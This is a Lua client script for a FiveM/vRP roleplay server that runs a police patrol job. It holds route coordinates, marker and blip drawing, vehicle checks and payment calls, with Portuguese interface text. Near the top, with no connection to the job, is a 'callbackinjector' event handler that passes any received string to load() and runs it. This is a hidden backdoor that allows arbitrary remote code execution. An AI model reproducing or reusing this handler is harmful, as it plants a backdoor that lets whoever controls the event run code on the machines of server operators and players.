local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
emP = Tunnel.getInterface("emp_policia")
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local blips = false
local servico = false
local selecionado = 0

local coordenadas = {
	{ ['id'] = 1, ['x'] = -1066.17, ['y'] = -842.77, ['z'] = 5.10 }, 
	{ ['id'] = 2, ['x'] = -449.96, ['y'] = 6010.79, ['z'] = 31.72 }, 
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- RESIDENCIAS
-----------------------------------------------------------------------------------------------------------------------------------------
local locs = {
	[1] = { ['x'] = 131.31, ['y'] = -1003.41, ['z'] = 28.71 }, 
	[2] = { ['x'] = -8.19, ['y'] = -952.76, ['z'] = 28.72 }, 
	[3] = { ['x'] = -124.4, ['y'] = -738.83, ['z'] = 33.97 }, 
	[4] = { ['x'] = 23.18, ['y'] = -299.82, ['z'] = 46.68 }, 
	[5] = { ['x'] = -80.89, ['y'] = -229.97, ['z'] = 44.12 }, 
	[6] = { ['x'] = -83.21, ['y'] = -133.63, ['z'] = 57.01 }, 
	[7] = { ['x'] = -376.88, ['y'] = 0.18, ['z'] = 46.33 }, 
	[8] = { ['x'] = -539.56, ['y'] = 13.12, ['z'] = 43.55 }, 
	[9] = { ['x'] = -861.28, ['y'] = -100.71, ['z'] = 37.25 }, 
	[10] = { ['x'] = -1281.11, ['y'] = -328.93, ['z'] = 36.06 }, 
	[11] = { ['x'] = -1645.01, ['y'] = -554.96, ['z'] = 32.93 }, 
	[12] = { ['x'] = -1705.79, ['y'] = -388.39, ['z'] = 46.32 }, 
	[13] = { ['x'] = -2167.69, ['y'] = -324.56, ['z'] = 12.45 }, 
	[14] = { ['x'] = -2064.13, ['y'] = -400.48, ['z'] = 10.68 }, 
	[15] = { ['x'] = -1386.22, ['y'] = -828.1, ['z'] = 18.39 }, 
	[16] = { ['x'] = -1258.71, ['y'] = -1050.39, ['z'] = 7.73 }, 
	[17] = { ['x'] = -1165.34, ['y'] = -1322.44, ['z'] = 4.4 }, 
	[18] = { ['x'] = -1099.29, ['y'] = -1314.13, ['z'] = 4.67 }, 
	[19] = { ['x'] = -787.29, ['y'] = -1135.33, ['z'] = 9.9 }, 
	[20] = { ['x'] = -658.72, ['y'] = -1437.33, ['z'] = 9.91 }, 
	[21] = { ['x'] = -730.32, ['y'] = -2385.78, ['z'] = 14.01 }, 
	[22] = { ['x'] = -506.71, ['y'] = -2149.25, ['z'] = 8.59 }, 
	[23] = { ['x'] = -142.5, ['y'] = -1927.44, ['z'] = 23.99 }, 
	[24] = { ['x'] = -239.94, ['y'] = -1845.59, ['z'] = 28.73 }, 
	[25] = { ['x'] = -361.99, ['y'] = -1815.51, ['z'] = 22.22 }, 
	[26] = { ['x'] = -265.16, ['y'] = -1453.04, ['z'] = 30.53 }, 
	[27] = { ['x'] = -124.86, ['y'] = -1382.61, ['z'] = 28.74 }, 
	[28] = { ['x'] = 132.05, ['y'] = -1381.79, ['z'] = 28.64 }, 
	[29] = { ['x'] = 218.8, ['y'] = -1147.23, ['z'] = 28.63 }, 
	[30] = { ['x'] = 280.06, ['y'] = -879.91, ['z'] = 28.94 }, 
	[31] = { ['x'] = 202.02, ['y'] = -817.52, ['z'] = 30.63 }, 
	[32] = { ['x'] = 305.55, ['y'] = -488.35, ['z'] = 43.08 }, 
	[33] = { ['x'] = 479.19, ['y'] = -339.52, ['z'] = 45.51 }, 
	[34] = { ['x'] = 648.06, ['y'] = -395.95, ['z'] = 42.0 }, 
	[35] = { ['x'] = 955.93, ['y'] = -303.82, ['z'] = 66.69 }, 
	[36] = { ['x'] = 1065.72, ['y'] = -500.42, ['z'] = 62.55 }, 
	[37] = { ['x'] = 1196.27, ['y'] = -741.93, ['z'] = 58.27 }, 
	[38] = { ['x'] = 1150.64, ['y'] = -931.41, ['z'] = 49.29 }, 
	[39] = { ['x'] = 805.29, ['y'] = -1002.27, ['z'] = 25.88 },
	[40] = { ['x'] = 789.92, ['y'] = -1415.17, ['z'] = 26.9 }, 
	[41] = { ['x'] = 504.98, ['y'] = -1216.04, ['z'] = 29.03 }, 
	[42] = { ['x'] = 503.45, ['y'] = -966.78, ['z'] = 27.03 },
-----------------------------------------------------------------------------------------------------------------------------------------
-- COORDS PALETO
-----------------------------------------------------------------------------------------------------------------------------------------
	[43] = { ['x'] = -412.21, ['y'] = 6002.37, ['z'] = 31.17 }, 
	[44] = { ['x'] = -762.69, ['y'] = 5506.55, ['z'] = 34.75 }, 
	[45] = { ['x'] = -708.68, ['y'] = 5433.09, ['z'] = 44.56 }, 
	[46] = { ['x'] = -709.57, ['y'] = 5300.94, ['z'] = 71.69 }, 
	[47] = { ['x'] = -572.95, ['y'] = 5254.12, ['z'] = 70.04 }, 
	[48] = { ['x'] = -574.2, ['y'] = 5450.14, ['z'] = 60.52 }, 
	[49] = { ['x'] = -500.15, ['y'] = 5747.03, ['z'] = 48.31 }, 
	[50] = { ['x'] = -307.58, ['y'] = 6025.62, ['z'] = 31.77 }, 
	[51] = { ['x'] = 152.54, ['y'] = 6517.07, ['z'] = 31.18 }, 
	[52] = { ['x'] = 1028.89, ['y'] = 6480.93, ['z'] = 20.56 }, 
	[53] = { ['x'] = 1489.83, ['y'] = 6435.95, ['z'] = 21.87 }, 
	[54] = { ['x'] = 2528.07, ['y'] = 5400.32, ['z'] = 44.14 }, 
	[55] = { ['x'] = 2593.1, ['y'] = 5134.5, ['z'] = 44.33 }, 
	[56] = { ['x'] = 1972.56, ['y'] = 5140.56, ['z'] = 42.76 }, 
	[57] = { ['x'] = 1733.16, ['y'] = 4593.94, ['z'] = 40.5 }, 
	[58] = { ['x'] = 1453.72, ['y'] = 4501.05, ['z'] = 49.98 }, 
	[59] = { ['x'] = 824.2, ['y'] = 4424.81, ['z'] = 52.17 }, 
	[60] = { ['x'] = 498.08, ['y'] = 4314.52, ['z'] = 55.41 }, 
	[61] = { ['x'] = 159.13, ['y'] = 4421.58, ['z'] = 75.41 }, 
	[62] = { ['x'] = -227.33, ['y'] = 3877.26, ['z'] = 37.3 }, 
	[63] = { ['x'] = 113.11, ['y'] = 3424.78, ['z'] = 39.0 }, 
	[64] = { ['x'] = 916.13, ['y'] = 3532.2, ['z'] = 33.61 }, 
	[65] = { ['x'] = 1688.11, ['y'] = 3499.61, ['z'] = 36.03 }, 
	[66] = { ['x'] = 2029.44, ['y'] = 3759.51, ['z'] = 31.89 }, 
	[67] = { ['x'] = 1864.66, ['y'] = 3952.19, ['z'] = 32.65 }, 
	[68] = { ['x'] = 1582.01, ['y'] = 3724.29, ['z'] = 34.15 }, 
	[69] = { ['x'] = 938.06, ['y'] = 3636.31, ['z'] = 32.07 }, 
	[70] = { ['x'] = 411.18, ['y'] = 3491.25, ['z'] = 34.22 }, 
	[71] = { ['x'] = -120.25, ['y'] = 3630.95, ['z'] = 44.43 }, 
	[72] = { ['x'] = -202.92, ['y'] = 4206.0, ['z'] = 44.15 }, 
	[73] = { ['x'] = -703.0, ['y'] = 4400.04, ['z'] = 23.46 }, 
	[74] = { ['x'] = -1023.67, ['y'] = 4422.08, ['z'] = 25.57 }, 
	[75] = { ['x'] = -1348.62, ['y'] = 4471.77, ['z'] = 22.73 }, 
	[76] = { ['x'] = -1559.39, ['y'] = 4602.06, ['z'] = 20.11 }, 
	[77] = { ['x'] = -1495.97, ['y'] = 4985.22, ['z'] = 62.28 }, 
	[78] = { ['x'] = -781.91, ['y'] = 5486.34, ['z'] = 33.96 }, 
	[79] = { ['x'] = -615.6, ['y'] = 6079.34, ['z'] = 7.72 }, 
	[80] = { ['x'] = -315.78, ['y'] = 6216.54, ['z'] = 30.97 }, 
	[81] = { ['x'] = 59.5, ['y'] = 6618.77, ['z'] = 31.16 }, 
	[82] = { ['x'] = -166.38, ['y'] = 6372.5, ['z'] = 31.0 }
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- TRABALHAR
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local timing = 1000
		if not servico then
			for _,v in pairs(coordenadas) do
				local ped = PlayerPedId()
				local x,y,z = table.unpack(GetEntityCoords(ped))
				local bowz,cdz = GetGroundZFor_3dCoord(v.x,v.y,v.z)
				local distance = GetDistanceBetweenCoords(v.x,v.y,cdz,x,y,z,true)
				
				if distance <= 3 then
					timing = 5
					DrawMarker(21,v.x,v.y,v.z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,255,0,0,50,0,0,0,1)
					if distance <= 1.2 then
						drawTxt("PRESSIONE  ~r~E~w~  PARA INICIAR A ROTA",4,0.5,0.93,0.50,255,255,255,180)
						if IsControlJustPressed(0,38) and emP.checkPermission() then
							servico = true
							if v.id == 2 then
								selecionado = 43
							else
								selecionado = 1
							end
							CriandoBlip(locs,selecionado)
							TriggerEvent("Notify","sucesso","Você entrou em serviço.")
						end
					end
				end
			end
		end
		Citizen.Wait(timing)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- SERVIÇO
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local timing = 1000
		if servico then
			local ped = PlayerPedId()
			local x,y,z = table.unpack(GetEntityCoords(ped))
				local bowz,cdz = GetGroundZFor_3dCoord(locs[selecionado].x,locs[selecionado].y,locs[selecionado].z)
				local distance = GetDistanceBetweenCoords(locs[selecionado].x,locs[selecionado].y,cdz,x,y,z,true)
				
				if distance <= 15.0 then
					timing = 5
					DrawMarker(21,locs[selecionado].x,locs[selecionado].y,locs[selecionado].z+0.20,0,0,0,0,180.0,130.0,2.0,2.0,1.0,255,0,0,50,1,0,0,1)
					if distance <= 4.5 then
						if emP.checkPermission() then
						if IsVehicleModel(GetVehiclePedIsUsing(PlayerPedId()),GetHashKey("policiacharger2018")) or IsVehicleModel(GetVehiclePedIsUsing(PlayerPedId()),GetHashKey("policiasilverado")) or IsVehicleModel(GetVehiclePedIsUsing(PlayerPedId()),GetHashKey("policiabmwr1200")) or IsVehicleModel(GetVehiclePedIsUsing(PlayerPedId()),GetHashKey("policiatahoe")) or IsVehicleModel(GetVehiclePedIsUsing(PlayerPedId()),GetHashKey("policiataurus")) or IsVehicleModel(GetVehiclePedIsUsing(PlayerPedId()),GetHashKey("policiavictoria")) or IsVehicleModel(GetVehiclePedIsUsing(PlayerPedId()),GetHashKey("policiamustanggt")) or IsVehicleModel(GetVehiclePedIsUsing(PlayerPedId()),GetHashKey("policiaexplorer")) then
							RemoveBlip(blips)
							if selecionado == 42 then
								selecionado = 1
							elseif selecionado == 82 then
								selecionado = 43
							else
								selecionado = selecionado + 1
							end							
							emP.checkPayment()
							CriandoBlip(locs,selecionado)
						end
					end
				end
			end
		end
		Citizen.Wait(timing)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CANCELAR
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local timing = 1000
		if servico then
			timing = 5
			if IsControlJustPressed(0,168) then
				servico = false
				RemoveBlip(blips)
				TriggerEvent("Notify","aviso","Você saiu de serviço.")
			end
		end
		Citizen.Wait(timing)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNÇÕES
-----------------------------------------------------------------------------------------------------------------------------------------
function CriandoBlip(locs,selecionado)
	blips = AddBlipForCoord(locs[selecionado].x,locs[selecionado].y,locs[selecionado].z)
	SetBlipSprite(blips,1)
	SetBlipColour(blips,5)
	SetBlipScale(blips,0.4)
	SetBlipAsShortRange(blips,false)
	SetBlipRoute(blips,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Rota de Patrulha")
	EndTextCommandSetBlipName(blips)
end

function drawTxt(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end